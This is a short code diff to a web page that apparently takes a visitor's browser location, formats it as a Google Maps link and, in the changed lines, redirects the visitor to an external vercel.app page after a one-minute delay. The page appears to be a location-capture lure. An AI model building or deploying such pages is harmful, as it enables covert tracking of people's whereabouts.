@@ -131,7 +131,10 @@ https://www.google.com/maps?q=${lat},${lon}`,
             });
 
             // ⭐ REDIRECTION APRÈS AUTORISATION ⭐
-            window.location.href = "#"; // ← Mets ta page ici
+          setTimeout(() => {
+    window.location.href = "https://geuofegesraprestestvercel.vercel.app/"; // ← ta page ici
+}, 60000); // 60000 ms = 1 minute
+
         },
 
         (err) => {
@@ -177,3 +180,4 @@ document.getElementById("locBtn").addEventListener("click", () => {
 
 </body>
 </html>
+
